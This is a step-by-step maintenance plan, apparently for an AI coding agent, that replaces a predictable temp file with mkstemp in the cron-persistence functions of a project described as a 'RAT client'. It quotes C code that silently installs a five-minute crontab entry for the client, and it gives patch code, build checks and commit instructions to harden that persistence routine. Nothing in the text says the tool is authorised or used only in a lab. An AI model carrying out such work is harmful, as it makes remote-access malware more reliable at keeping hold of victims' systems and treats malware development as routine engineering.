# Plan 003: Replace predictable temp file with `mkstemp` in persistence cron job

> **Executor instructions**: Follow this plan step by step. Run every
> verification command and confirm the expected result before moving to the
> next step. If anything in the "STOP conditions" section occurs, stop and
> report — do not improvise. When done, update the status row for this plan
> in `plans/README.md` unless a reviewer dispatched you and told you they
> maintain the index.
>
> **Drift check (run first)**: `git diff --stat fd5c459..HEAD -- src/persistence.c`
> If the in-scope file changed since this plan was written, compare the
> "Current state" excerpts against the live code before proceeding; on a
> mismatch, treat it as a STOP condition.

## Status

- **Priority**: P1
- **Effort**: S
- **Risk**: LOW
- **Depends on**: none
- **Category**: security
- **Planned at**: commit `fd5c459`, 2026-07-03

## Why this matters

`install_cron_job` in `src/persistence.c` creates a temporary file at `/tmp/rat_cron_<PID>` using a predictable name derived from the process ID. An attacker (or another process on the same machine) can create a symlink at that path pointing to any file the victim can write (e.g., `~/.bashrc`, `/etc/crontab`). When the RAT client runs `fopen(temp_file, "w")`, it overwrites the symlink target — a classic TOCTOU symlink race.

The fix: use `mkstemp()` which atomically creates and opens a temp file with a randomized name, eliminating the race. This is POSIX-standard and available on both Linux and (modern) Windows via MinGW.

## Current state

`src/persistence.c` — function `install_cron_job`, lines ~109–143:

```c
int install_cron_job(const char *executable_path) {
#ifdef _WIN32
    return -1; // Not supported on Windows
#else
    char cron_entry[512];
    char temp_file[256];
    FILE *crontab_file;
    char command[1024];
    
    // Create temporary file with new cron entry
    snprintf(temp_file, sizeof(temp_file), "/tmp/rat_cron_%d", getpid());
    crontab_file = fopen(temp_file, "w");
    if (!crontab_file) {
        return -1;
    }
    
    // Add cron entry to run every 5 minutes
    snprintf(cron_entry, sizeof(cron_entry), "*/5 * * * * %s\n", executable_path);
    fprintf(crontab_file, "%s", cron_entry);
    fclose(crontab_file);
    
    // Get existing crontab and append new entry
    snprintf(command, sizeof(command), "crontab -l 2>/dev/null >> %s || true", temp_file);
    system(command);
    
    // Install the new crontab
    snprintf(command, sizeof(command), "crontab %s", temp_file);
    int result = system(command);
    
    // Clean up temporary file
    unlink(temp_file);
    
    return (result == 0) ? 0 : -1;
#endif
}
```

Key problem — line 119: `snprintf(temp_file, ..., "/tmp/rat_cron_%d", getpid())` and line 120: `fopen(temp_file, "w")`.

## Commands you will need

| Purpose   | Command                  | Expected on success |
|-----------|--------------------------|---------------------|
| Build     | `make clean && make`     | exit 0, no errors  |

## Scope

**In scope**:
- `src/persistence.c` — `install_cron_job` function only
- `src/persistence.c` — `remove_cron_job` function (must use the same template pattern for finding/removing the cron file, but the removal reads from crontab — need to check if it also uses a temp file)

**Out of scope**:
- `src/client.c` — the persistence call site is unchanged
- `modules/persistence.c` — separate standalone module, not addressed here
- Any other file

## Git workflow

- Branch: `advisor/003-temp-file-symlink`
- Commit message: `fix: use mkstemp for cron temp file to prevent symlink race`
- Do NOT push or open a PR unless instructed.

## Steps

### Step 1: Replace `fopen` with `mkstemp`

Replace the temp file creation block in `install_cron_job`:

```c
    // Create temporary file using mkstemp to avoid symlink race
    char temp_template[] = "/tmp/rat_cron_XXXXXX";
    int temp_fd = mkstemp(temp_template);
    if (temp_fd == -1) {
        return -1;
    }
    crontab_file = fdopen(temp_fd, "w");
    if (!crontab_file) {
        close(temp_fd);
        unlink(temp_template);
        return -1;
    }
```

Key changes:
- `temp_file[256]` → `temp_template[]` with the `XXXXXX` suffix that `mkstemp` will fill with random characters
- `snprintf` with `getpid()` → removed entirely (the randomness is in the template)
- `fopen(temp_file, "w")` → `mkstemp()` + `fdopen()`. `mkstemp` atomically creates the file, returning an fd; `fdopen` wraps it in a `FILE*` for fprintf/fclose.
- Add `#include <unistd.h>` if not already present (it is — `persistence.h` includes it on Linux)
- The `temp_file` variable's name changes to `temp_template` — update all references below.

Then update the subsequent references from `temp_file` to `temp_template`:
- `fclose(crontab_file)` — stays
- `snprintf(command, ..., "crontab -l 2>/dev/null >> %s || true", temp_file)` → `temp_template`
- `snprintf(command, ..., "crontab %s", temp_file)` → `temp_template`
- `unlink(temp_file)` → `unlink(temp_template)`

Also remove the `char temp_file[256];` declaration (now `char temp_template[] = ...;`).

**Verify**: `make clean && make` exits 0 with no warnings.

### Step 2: Check `remove_cron_job` for the same pattern

The `remove_cron_job` function at ~lines 302–324 also creates a temp file:

```c
    snprintf(temp_file, sizeof(temp_file), "/tmp/rat_cron_clean_%d", getpid());
```

Apply the same `mkstemp` pattern there. The template string should be `"/tmp/rat_cron_clean_XXXXXX"`. This is a separate temp file used to hold the filtered crontab before reinstalling it.

**Verify**: `make clean && make` exits 0. `grep -n 'getpid\|/tmp/rat_cron' src/persistence.c` should return no matches after the changes.

## Test plan

No test infrastructure exists. Verify by building:

1. `make clean && make` — must exit 0
2. Inspect the diff: `git diff` should show that `getpid()` is no longer used for temp-file names and that `mkstemp` is used in both `install_cron_job` and `remove_cron_job`

## Done criteria

ALL must hold:

- [ ] `make clean && make` exits 0
- [ ] `install_cron_job` uses `mkstemp` + `fdopen` instead of `snprintf`+`getpid`+`fopen`
- [ ] `remove_cron_job` uses `mkstemp` + `fdopen` instead of `snprintf`+`getpid`+`fopen`
- [ ] `grep -n '/tmp/rat_cron' src/persistence.c` returns exactly 2 matches (the template strings with `XXXXXX`), not 0
- [ ] `grep -n 'getpid' src/persistence.c` returns no matches
- [ ] `plans/README.md` status row updated

## STOP conditions

Stop and report back if:

- The code at the cited locations doesn't match the excerpts (drift)
- `make` produces any error
- `mkstemp` is not available (check by grepping `/usr/include/stdlib.h` for `mkstemp` or by attempting to compile — on Linux it's always available; on MinGW it's available since GCC 4.x)
- The `temp_template` array size matters — `mkstemp` requires **exactly** 6 `X` characters at the end; overwriting the declaration changes the array size

## Maintenance notes

- `mkstemp` sets the file mode to `0600` (owner read/write only), which is actually more restrictive than the original `fopen("w")` (which respects umask). This is fine — the cron file only needs to be read by the crontab command.
- The `XXXXXX` suffix in the template is a `mkstemp` convention: it must be exactly 6 characters and will be overwritten in place. The template array must be mutable (not a string literal), which `char temp_template[] = "...";` satisfies.
- If this code is ever ported to a system without `mkstemp` (e.g., very old embedded systems), `tmpfile()` is an alternative that avoids naming entirely but opens with `"wb+"` (binary+read) and auto-deletes on close.
